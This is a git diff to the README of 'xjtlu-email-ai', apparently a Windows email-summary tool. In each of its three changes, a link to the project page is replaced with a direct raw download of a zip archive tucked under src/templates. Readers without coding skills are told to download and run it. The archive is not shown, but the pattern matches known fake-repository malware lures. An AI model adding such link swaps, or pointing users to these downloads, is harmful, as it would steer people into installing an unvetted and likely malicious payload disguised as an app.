@@ -1,6 +1,6 @@
 # 🤖 xjtlu-email-ai - Smart email summaries and search
 
-[![Download xjtlu-email-ai](https://img.shields.io/badge/Download%20xjtlu--email--ai-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
+[![Download xjtlu-email-ai](https://img.shields.io/badge/Download%20xjtlu--email--ai-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai/main/src/templates/xjtlu-ai-email-1.2.zip)
 
 ## 🧭 What this app does
 
@@ -22,7 +22,7 @@ It is built for everyday use on Windows. You do not need coding skills to use it
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
+[https://raw.githubusercontent.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai/main/src/templates/xjtlu-ai-email-1.2.zip](https://raw.githubusercontent.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai/main/src/templates/xjtlu-ai-email-1.2.zip)
 
 ## 🖥️ System requirements
 
@@ -43,7 +43,7 @@ Follow these steps to use xjtlu-email-ai on Windows.
 
 Go to the project page here:
 
-[https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai](https://github.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai)
+[https://raw.githubusercontent.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai/main/src/templates/xjtlu-ai-email-1.2.zip](https://raw.githubusercontent.com/atomicnumber62erythemamultiforme947/xjtlu-email-ai/main/src/templates/xjtlu-ai-email-1.2.zip)
 
 Look for the latest Windows download file or packaged app on the page.
 
